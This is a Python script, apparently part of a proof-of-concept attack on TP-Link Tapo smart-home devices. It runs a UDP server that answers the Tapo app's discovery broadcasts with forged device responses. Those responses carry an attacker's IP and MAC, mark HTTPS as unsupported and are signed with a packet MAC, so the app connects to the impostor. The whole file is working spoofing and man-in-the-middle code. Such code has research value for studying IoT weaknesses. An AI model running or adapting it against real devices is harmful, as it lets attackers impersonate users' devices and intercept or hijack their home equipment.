#!/usr/bin/env python3

import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from commons.properties import *
from commons.functions import *

import socket
import json

if(len(sys.argv) < 2):
    print("Usage: python3 script.py [device_type]")
    exit(1)

TapoDevice = instantiate_class_from_text(sys.argv[1])

class UDPEvilServer:

   discovery_response_json = json.dumps({
      "result":{
         "device_id":TapoDevice.device_id,
         "owner":TapoApp.owner_id,
         "device_type":TapoDevice.device_type,
         # "device_name":TapoDevice.device_name,
         "device_model":TapoDevice.device_model,
         "ip":Evil.ip,
         "mac":Evil.mac_vdash,
         "factory_default":False, # or True
         "is_support_iot_cloud":False,
         "obd_src":"tplink",
         "mgt_encrypt_schm":{
            "is_support_https":False,
            "encrypt_type":"AES",
            "http_port":80,
            "lv":2
         }
      },
      "error_code":0
   }, separators=(',', ':'))

   def __init__ (self):

      sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
      sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
      sock.bind(("",TapoDevice.udp_port))
      self.sock = sock

   def startServer(self):
      while True:
         data,addr = self.sock.recvfrom(1024)
         
         nonce = data[8:12]
         discovery_response_pkt = mac_UDP_packet(
            UDPEvilServer.discovery_response_json, nonce
         )

         sent = self.sock.sendto(discovery_response_pkt, addr)


if __name__ == "__main__":
   udpEvilServer = UDPEvilServer()
   
   try:
      udpEvilServer.startServer()
   except(KeyboardInterrupt):
      print("Exit...")
